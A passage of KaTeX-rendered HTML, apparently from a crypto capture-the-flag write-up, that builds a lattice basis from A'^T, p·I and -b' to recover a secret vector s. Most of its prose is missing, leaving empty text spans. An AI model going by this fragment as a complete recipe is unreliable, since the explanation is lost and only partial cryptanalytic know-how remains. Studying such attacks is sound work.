style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext></mtext><mi>L</mi><mtext></mtext></mrow><annotation encoding="application/x-tex"> (n+m+1)(n+m+1)  L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">L</span><span class="mord cjk_fallback"></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi mathvariant="bold">I</mi><mrow><mi>n</mi><mo></mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><msup><mi mathvariant="bold">A</mi><mo mathvariant="bold" lspace="0em" rspace="0em"></mo></msup><msubsup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo></mo><mi>m</mi></mrow><mi>T</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>m</mi><mo></mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mo></mo><msub><mi mathvariant="bold">I</mi><mrow><mi>m</mi><mo></mo><mi>m</mi></mrow></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mi>m</mi><mo></mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mn mathvariant="bold">0</mn><mrow><mn>1</mn><mo></mo><mi>n</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mo stretchy="false">(</mo><msup><mi mathvariant="bold">b</mi><mo mathvariant="bold" lspace="0em" rspace="0em"></mo></msup><msubsup><mo stretchy="false">)</mo><mrow><mn>1</mn><mo></mo><mi>m</mi></mrow><mi>T</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L = \begin{pmatrix} \mathbf{I}_{n \times n} &amp; (\mathbf{A&#x27;})_{n \times m}^T &amp; \mathbf{0}_{n \times 1} \\ \mathbf{0}_{m \times n} &amp; p \cdot \mathbf{I}_{m \times m} &amp; \mathbf{0}_{m \times 1} \\ \mathbf{0}_{1 \times n} &amp; -(\mathbf{b&#x27;})^T_{1 \times m} &amp; 1 \\ \end{pmatrix} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6026619999999996em;vertical-align:-1.5513309999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M291 0 H417 V300 H291 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">I</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathbf">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight"></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.305331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">I</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathbf">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight"></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999998em;"><span style="top:-2.451892em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M457 0 H583 V300 H457 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>S</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">PS</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>c</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>35</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>k</mi><mn>49</mn></msub><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mtext></mtext><mi>v</mi><mo>=</mo><mi>c</mi><mo></mo><mi>L</mi></mrow><annotation encoding="application/x-tex">c=(s_{0},...,s_{35},k_{0},...,k_{49},1)v=c\cdot L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>n</mi></msub><mtext></mtext><mi>v</mi><mtext></mtext><mi>n</mi><mtext></mtext><mo stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>35</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_{n}vn(s_{0},...,s_{35})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mn>1</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>m</mi><mtext></mtext><mi>i</mi><mtext></mtext><mo stretchy="false">(</mo><mi>s</mi><mo></mo><msup><mi>A</mi><mrow><mo mathvariant="normal"></mo><mi>T</mi></mrow></msup><msub><mo stretchy="false">)</mo><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><mi>k</mi><mo></mo><mi>p</mi><mi>I</mi><msub><mo stretchy="false">)</mo><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo></mo><mo></mo><msup><mi>b</mi><mrow><mo mathvariant="normal"></mo><mi>T</mi></mrow></msup><msub><mo stretchy="false">)</mo><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">mi(s * A&#x27;^T)_i + (k * pI)_i + (1 * -b&#x27;^T)_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">m</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">i</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span 